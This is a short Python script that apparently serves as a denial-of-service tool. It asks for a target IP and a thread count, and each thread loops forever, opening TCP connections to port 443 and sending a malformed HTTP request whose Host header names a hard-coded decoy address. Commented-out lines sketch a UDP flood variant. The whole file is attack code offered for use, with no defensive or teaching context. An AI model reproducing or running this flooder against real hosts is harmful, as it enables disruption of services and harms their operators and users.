import threading
import socket
#import random

target= input('ip : ')
#ip = str(input("ip: "))
port = 443
threadd= int(input('thread: '))
fake_ip= '212.29.241.223'
#bytes = random._urandom(1490)

#target= str(input("ip: "))
#port = int(input("port: "))
#threadd= int(input('thread: '))
#bytes = input('size packet:')

already_connected = 0

def attack():
   while True:
      s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
      s.connect((target, port))
      s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'),(target, port))
      s.sendto(("Host /" + fake_ip + "\r\n\r\n").encode('ascii'),(target, port))
      s.close()
      
      global already_connected
      already_connected +=1
      print(target,port,"count :",already_connected)
      
      
      #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      #s.sendto((bytes).encode('utf8'), (target,port))
      #s.close()

      #global already_connected
      #already_connected +=1
      #print(target,port,bytes,"count :",already_connected)

      

for i in range(threadd):
    thread=threading.Thread(target=attack)
    thread.start()
